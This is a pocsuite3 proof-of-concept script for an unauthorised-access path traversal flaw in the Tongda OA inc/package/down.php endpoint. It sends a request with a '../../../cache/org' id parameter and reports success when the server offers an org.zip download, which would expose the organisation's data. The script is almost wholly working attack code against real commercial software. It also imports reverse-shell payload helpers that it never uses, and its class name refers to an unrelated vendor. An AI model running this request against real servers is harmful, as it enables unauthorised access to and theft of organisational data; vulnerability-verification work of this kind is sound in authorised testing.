# _*_ coding:utf-8 _*_
# @Time : 2023/11/30 19:26
# @Author: 为赋新词强说愁

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class dahuaAttachmet(POCBase):
    pocDesc = '''通达OA inc/package/down.php接口未授权访问漏洞'''
    vulID = '2023113001'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-30'
    createDate = '2023-11-30'
    updateDate = '2023-11-30'
    name = '通达OA inc/package/down.php接口未授权访问漏洞'
    appName = '通达OA'



    def _verify(self):

        result = {}
        path = "/inc/package/down.php?id=../../../cache/org"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
        }

        url = self.url + path
        payload = "/inc/package/down.php?id=../../../cache/org"
        try:
            response = requests.get(url, headers=headers,verify=False)
        # 验证成功输出相关信息
            if response.status_code == 200 and 'org.zip' in response.headers['Content-Disposition']:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(dahuaAttachmet)